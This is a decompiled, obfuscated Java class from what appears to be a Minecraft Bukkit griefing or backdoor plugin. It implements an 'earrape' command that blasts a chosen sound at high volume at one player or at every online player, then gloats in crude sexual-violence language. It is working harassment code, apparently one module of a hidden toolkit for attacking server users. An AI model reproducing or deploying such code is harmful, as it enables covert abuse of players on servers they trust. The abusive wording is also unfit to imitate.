/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.Sound
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.Sound;
import org.bukkit.entity.Player;

public class EarrapeCommand
extends Command {
    private /* synthetic */ Sound removeConnectionThread;

    @Override
    public boolean isBlatant() {
        return true;
    }

    public EarrapeCommand() {
        EarrapeCommand llllllllllllllllIIIIlIIlIlIlIllI;
    }

    @Override
    public void execute(Core llllllllllllllllIIIIlIIlIlIIllII, String llllllllllllllllIIIIlIIlIlIIlIll, String[] llllllllllllllllIIIIlIIlIlIIlIlI, Player llllllllllllllllIIIIlIIlIlIIIllI) {
        if (llllllllllllllllIIIIlIIlIlIIlIlI.length == 3) {
            EarrapeCommand llllllllllllllllIIIIlIIlIlIIllIl;
            try {
                llllllllllllllllIIIIlIIlIlIIllIl.removeConnectionThread = Sound.valueOf((String)llllllllllllllllIIIIlIIlIlIIlIlI[1].toUpperCase());
            }
            catch (IllegalArgumentException llllllllllllllllIIIIlIIlIlIlIIII) {
                llllllllllllllllIIIIlIIlIlIIIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The sound ").append(Settings.RED).append(llllllllllllllllIIIIlIIlIlIIlIlI[1]).append(Settings.WHITE).append(" was not found!"))));
                return;
            }
            if (llllllllllllllllIIIIlIIlIlIIlIlI[2].equals("*")) {
                for (Player llllllllllllllllIIIIlIIlIlIIllll : Bukkit.getOnlinePlayers()) {
                    llllllllllllllllIIIIlIIlIlIIllll.playSound(llllllllllllllllIIIIlIIlIlIIllll.getLocation(), llllllllllllllllIIIIlIIlIlIIllIl.removeConnectionThread, 20.0f, 10.0f);
                }
                llllllllllllllllIIIIlIIlIlIIIllI.sendMessage(Settings.PREFIX("Everyone has been ear raped!"));
            } else {
                Player llllllllllllllllIIIIlIIlIlIIlllI = Bukkit.getServer().getPlayer(llllllllllllllllIIIIlIIlIlIIlIlI[2]);
                if (llllllllllllllllIIIIlIIlIlIIlllI == null) {
                    llllllllllllllllIIIIlIIlIlIIIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllllIIIIlIIlIlIIlIlI[2]).append(Settings.WHITE).append(" is not online."))));
                } else {
                    llllllllllllllllIIIIlIIlIlIIlllI.playSound(llllllllllllllllIIIIlIIlIlIIlllI.getLocation(), llllllllllllllllIIIIlIIlIlIIllIl.removeConnectionThread, 20.0f, 10.0f);
                    llllllllllllllllIIIIlIIlIlIIIllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append(llllllllllllllllIIIIlIIlIlIIlllI.getName()).append(" has been ear raped!"))));
                }
            }
        } else {
            llllllllllllllllIIIIlIIlIlIIIllI.sendMessage(Settings.USAGE("earrape <sound> <player | *>"));
        }
    }
}

